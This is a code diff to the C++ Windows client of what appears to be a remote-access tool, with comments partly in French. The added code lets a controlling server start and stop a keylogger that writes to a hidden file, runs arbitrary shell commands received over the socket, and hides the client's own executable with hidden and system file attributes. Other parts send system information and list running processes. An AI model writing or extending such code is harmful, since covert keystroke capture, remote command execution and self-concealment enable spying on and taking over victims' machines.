@@ -8,6 +8,7 @@
 #include "../utils/TaskList.hpp"
 #include "../utils/NetworkInfoFactory.hpp"
 #include "../utils/KeyLogger.hpp"
+#include "../utils/BashExec.hpp"
 #include "../utils/Hash_Sha256.hpp"
 #include "../utils/LPTF_PacketUtils.hpp"
 #include <iostream>
@@ -22,6 +23,9 @@ using namespace std;
 // Global variables for thread communication
 atomic<bool> running(true);
 LPTF_Socket* globalSocket = nullptr;
+static KeyLogger* globalLogger = nullptr;
+static std::thread keylogThread;
+
 
 // Thread function to handle server requests
 void serverRequestHandler() {
@@ -58,6 +62,41 @@ void serverRequestHandler() {
                     break;
                 }
                 
+                case PacketType::KEYLOG: {
+                    // Start or stop keylogger based on payload
+                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
+                    if (cmd == "start") {
+                        if (!globalLogger) {
+                            globalLogger = new KeyLogger("key_file.txt");
+                            KeyLogger::hideFile("key_file.txt");
+                            keylogThread = std::thread([]() {
+                                globalLogger->start();
+                            });
+                            keylogThread.detach();
+                            }
+                        }
+                        else if (cmd == "stop") {
+                            if (globalLogger) {
+                                globalLogger->stop();
+                                KeyLogger::unhideFile("key_file.txt");
+                                delete globalLogger;
+                                globalLogger = nullptr;
+                            }
+                        }
+
+                    break;
+                }
+
+
+
+                case PacketType::EXEC_COMMAND: {
+                    std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
+                    BashExec exec;
+                    BashExec::executeToFile(cmd, "exec_output.txt");
+                    break;
+                }
+
+                
                 default:
                     cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << endl;
                     cout << "Entrez le message : ";
@@ -77,8 +116,6 @@ void serverRequestHandler() {
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
-
-
 
     // test des fonction getipaddresses getmacaddresses de collecte d'informations réseau
     //! to delete later
@@ -103,6 +140,11 @@ int main() {
         std::cout << "  " << mac << "\n";
     }
     // fin de test des fonction de collecte d'informations réseau
+    // Hide the current executable
+    char exePath[MAX_PATH];
+    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+    SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+    KeyLogger::hideFile("key_file.txt");
 
     try {
         LPTF_Socket::initialize();
@@ -151,30 +193,30 @@ int main() {
         clientSocket.sendBinary(sysInfoPacket.serialize());
         
         // KEYLOGGER 
-        std::thread([]() {
-            KeyLogger logger("key_file.txt");
-            logger.start();
-        }).detach();
+        // std::thread([]() {
+        //     KeyLogger logger("key_file.txt");
+        //     logger.start();
+        // }).detach();
         // ========================
         ProcessLister processLister;
-        cout << "\nListe des processus en cours d'exécution :" << endl;
-        if (!processLister.listProcesses()) {
-            cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
-        }
+        // cout << "\nListe des processus en cours d'exécution :" << endl;
+        // if (!processLister.listProcesses()) {
+        //     cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
+        // }
 
         vector<string> exeList = processLister.getExeList();
 
-        cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
-        const int columns = 3;
-        int count = 0;
-        for (const auto& exe : exeList) {
-            cout << std::left << std::setw(25) << exe; 
-            count++;
-            if (count % columns == 0)
-                cout << endl;
-        }
-        if (count % columns != 0)
-            cout << endl;
+        // cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
+        // const int columns = 3;
+        // int count = 0;
+        // for (const auto& exe : exeList) {
+        //     cout << std::left << std::setw(25) << exe; 
+        //     count++;
+        //     if (count % columns == 0)
+        //         cout << endl;
+        // }
+        // if (count % columns != 0)
+        //     cout << endl;
 
         cout << "(Tapez 'sortie' pour quitter)" << endl;
         
